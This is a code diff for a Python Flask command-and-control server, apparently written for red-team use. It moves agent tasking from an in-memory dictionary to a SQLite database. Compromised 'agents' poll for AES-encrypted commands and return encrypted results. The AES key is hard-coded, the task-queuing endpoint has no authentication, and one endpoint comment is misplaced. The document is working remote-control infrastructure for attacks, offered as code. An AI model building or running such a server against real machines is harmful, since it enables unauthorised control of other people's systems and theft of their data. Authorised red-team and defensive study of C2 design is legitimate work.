@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify
 from Cryptodome.Cipher import AES
 from Cryptodome.Util.Padding import pad, unpad
 import base64
+import sqlite3
 
 # This MUST be exactly 16, 24, or 32 bytes long
 SECRET_KEY = b'SixteenByteKey!!' 
@@ -24,46 +25,101 @@ def decrypt_msg(encoded_ciphertext):
     # Decrypt and remove padding
     return unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')
 
+def init_db():
+    conn = sqlite3.connect('c2.db')
+    cursor = conn.cursor()
+    
+    # Create Agents table
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS agents (
+            agent_id TEXT PRIMARY KEY,
+            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # Create Tasks table
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS tasks (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            agent_id TEXT,
+            command TEXT,
+            result TEXT,
+            status TEXT DEFAULT 'pending',
+            FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
+        )
+    ''')
+    
+    conn.commit()
+    conn.close()
+
 app = Flask(__name__)
 
-# Dictionary for storing tasks for each agent. I will be replacing this with a database in the future
-# Key: Agent ID, Value: The command to run
-task_queue = {
-    "agent_001": "whoami" # A default task for our first test
-}
-
-# Endpoint 1: The Agent calls this to get a task
 @app.route('/get_task/<agent_id>', methods=['GET'])
 def get_task(agent_id):
-    # Check if we have a task for this specific agent
-    task = task_queue.get(agent_id, "nop")
+    conn = sqlite3.connect('c2.db')
+    cursor = conn.cursor()
     
-    # Once the task is grabbed, we clear the queue so it doesn't run twice
-    task_queue[agent_id] = "nop"
-    encrypted_payload = encrypt_msg(task)
-    return jsonify({"task": encrypted_payload})
+    # Update 'last_seen' for the agent
+    cursor.execute("INSERT OR REPLACE INTO agents (agent_id) VALUES (?)", (agent_id,))
+    
+    # Fetch the oldest pending task
+    cursor.execute("SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1", (agent_id,))
+    row = cursor.fetchone()
+    
+    if row:
+        task_id, command = row
+        # Mark as sent
+        cursor.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task_id,))
+        conn.commit()
+        payload = encrypt_msg(command)
+    else:
+        payload = encrypt_msg("nop")
+        
+    conn.close()
+    return jsonify({"task": payload})
 
 # Endpoint 2: The Agent calls this to send back results
+@app.route('/set_task/<agent_id>', methods=['POST'])
+def set_task(agent_id):
+    command = request.json.get("command")
+    
+    conn = sqlite3.connect('c2.db')
+    cursor = conn.cursor()
+    # Insert a new pending task
+    cursor.execute("INSERT INTO tasks (agent_id, command) VALUES (?, ?)", (agent_id, command))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"status": "queued"})
+
+# 3. Endpoint 3: Red team endpoint to send commands to agents
 @app.route('/post_result/<agent_id>', methods=['POST'])
 def post_result(agent_id):
     encrypted_data = request.json.get("result")
-    try:
-        decrypted_result = decrypt_msg(encrypted_data)
-        print(f"\n[+] Decrypted Result from {agent_id}:")
-        print(decrypted_result)
-    except Exception as e:
-        print(f"[-] Failed to decrypt result: {e}")
+    decrypted_result = decrypt_msg(encrypted_data)
     
+    # Connect to the database
+    conn = sqlite3.connect('c2.db')
+    cursor = conn.cursor()
+    
+    # SQL LOGIC:
+    # 1. Find the most recent task for this agent that is marked as 'sent'
+    # 2. Update that task's result and mark it as 'completed'
+    cursor.execute('''
+        UPDATE tasks 
+        SET result = ?, status = 'completed' 
+        WHERE id = (
+            SELECT id FROM tasks 
+            WHERE agent_id = ? AND status = 'sent' 
+            ORDER BY id DESC LIMIT 1
+        )
+    ''', (decrypted_result, agent_id))
+    
+    conn.commit()
+    conn.close()
+    
+    print(f"[+] Result saved to database for {agent_id}")
     return jsonify({"status": "success"})
-
-# 3. Endpoint 3: Red team endpoint to send commands to agents
-# I need to add some layer of security so blue team can't just send commands to the agents
-@app.route('/set_task/<agent_id>', methods=['POST'])
-def set_task(agent_id):
-    new_command = request.json.get("command")
-    task_queue[agent_id] = new_command
-    print(f"[*] Task queued for {agent_id}: {new_command}")
-    return jsonify({"status": "queued"})
 
 if __name__ == '__main__':
     # Running on port 5000
